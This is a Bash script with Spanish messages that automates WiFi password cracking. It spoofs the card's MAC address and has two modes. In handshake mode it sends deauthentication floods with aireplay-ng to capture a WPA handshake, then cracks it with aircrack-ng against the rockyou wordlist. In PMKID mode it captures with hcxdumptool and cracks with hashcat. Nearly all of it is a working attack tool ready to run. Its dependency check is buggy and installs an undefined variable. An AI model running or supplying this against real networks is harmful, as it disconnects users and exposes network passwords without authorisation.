#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

export DEBIAN_FRONTEND=noninteractive

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour}Saliendo${endColour}"
	tput cnorm; airmon-ng stop ${networkCard} > /dev/null 2>&1
	rm Captura* 2>/dev/null
	stopAttack
	exit 0
}

function helpPanel(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Uso: ./s4viPwnWifi.sh${endColour}"
	echo -e "\n\t${purpleColour}a)${endColour}${yellowColour} Modo de ataque${endColour}"
	echo -e "\t\t${redColour}Handshake${endColour}"
	echo -e "\t\t${redColour}PKMID${endColour}"
	echo -e "\t${purpleColour}n)${endColour}${yellowColour} Nombre de la tarjeta de red${endColour}"
	echo -e "\t${purpleColour}h)${endColour}${yellowColour} Mostrar este panel de ayuda${endColour}\n"
	exit 0
}

function dependencies(){
	tput civis
	clear

	echo -e "${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...${endColour}"
	sleep 2

	test -f /usr/bin/macchanger

	if [ "$(echo $?)" == "0" ]; then
		echo -e " ${greenColour}macchanger (V)${endColour}"
	else
		echo -e " ${redColour}(X)${endColour}\n"
		echo -e "${yellowColour}[*]${endColour}${grayColour} Instalando herramienta ${endColour}${blueColour}macchanger${endColour}${yellowColour}...${endColour}"
		apt-get install $program -y > /dev/null 2>&1

	fi; sleep 2

     test -f /usr/local/bin/aircrack-ng

     if [ "$(echo $?)" == "0" ]; then
         echo -e " ${greenColour}aircrack-ng (V)${endColour}"
     else
         echo -e " ${redColour}(X)${endColour}\n"
         echo -e "${yellowColour}[*]${endColour}${grayColour} Instalando herramienta ${endColour}${blueColour}aircrack-ng${endColour}${yellowColour}...${endColour}"
         apt-get install $program -y > /dev/null 2>&1
     fi; sleep 1
}

function stopAttack(){
         clear
         echo -e "${yellowColour}[*]${endColour}${grayColour} Restaurando tarjeta de red...${endColour}\n"

        ifconfig $networkCard down
		macchanger -p $networkCard > /dev/null 2>&1
		ifconfig $networkCard up
		airmon-ng stop $networkCard > /dev/null 2>&1
		systemctl restart NetworkManager

         echo -e "${yellowColour}[*]${endColour}${grayColour} MAC y servicio de red restaurado ${endColour}${purpleColour}[${endColour}${blueColour}$(macchanger -s ${networkCard}| grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}${purpleColour}]${endColour}"
}

function startAttack(){
		clear
		echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando tarjeta de red...${endColour}\n"
		airmon-ng check kill > /dev/null 2>&1
		airmon-ng start $networkCard > /dev/null 2>&1
		ifconfig ${networkCard} down && macchanger -a ${networkCard} > /dev/null 2>&1
		ifconfig ${networkCard} up

		echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva dirección MAC asignada ${endColour}${purpleColour}[${endColour}${blueColour}$(macchanger -s ${networkCard} | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}${purpleColour}]${endColour}"

	if [ "$(echo $attack_mode)" == "Handshake" ]; then

		xterm -hold -e "airodump-ng ${networkCard}" &
		airodump_xterm_PID=$!
		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso: ${endColour}" && read apName
		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Canal del punto de acceso: ${endColour}" && read apChannel

		kill -9 $airodump_xterm_PID
		wait $airodump_xterm_PID 2>/dev/null

		xterm -hold -e "airodump-ng -c $apChannel -w Captura --essid $apName ${networkCard}" &
		airodump_filter_xterm_PID=$!

		sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF ${networkCard}" &
		aireplay_xterm_PID=$!
		sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

		sleep 10; kill -9 $airodump_filter_xterm_PID
		wait $airodump_filter_xterm_PID 2>/dev/null

		xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &

	elif [ "$(echo $attack_mode)" == "PKMID" ]; then
		clear; echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ClientLess PKMID Attack...${endColour}\n"
		sleep 2
		timeout 60 bash -c "hcxdumptool -i ${networkCard} --enable_status=1 -o Captura"
		echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Obteniendo Hashes...${endColour}\n"
		sleep 2
		hcxpcaptool -z myHashes Captura; rm Captura 2>/dev/null

		test -f myHashes

		if [ "$(echo $?)" == "0" ]; then
			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando proceso de fuerza bruta...${endColour}\n"
			sleep 2

			hashcat -m 16800 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
		else
			echo -e "\n${redColour}[!]${endColour}${grayColour} No se ha podido capturar el paquete necesario...${endColour}\n"
			rm Captura* 2>/dev/null
			sleep 2
		fi
	else
		echo -e "\n${redColour}[*] Este modo de ataque no es válido${endColour}\n"
	fi
	stopAttack
}

# Main Function

if [ "$(id -u)" == "0" ]; then
	declare -i parameter_counter=0; while getopts ":a:n:h:" arg; do
		case $arg in
			a) attack_mode=$OPTARG; let parameter_counter+=1 ;;
			n) networkCard=$OPTARG; let parameter_counter+=1 ;;
			h) helpPanel;;
		esac
	done

	if [ $parameter_counter -ne 2 ]; then
		helpPanel
	else
		dependencies
		startAttack
		tput cnorm; airmon-ng stop ${networkCard} > /dev/null 2>&1
	fi
else
	echo -e "\n${redColour}[*] Ejecutar como root${endColour}\n"
fi
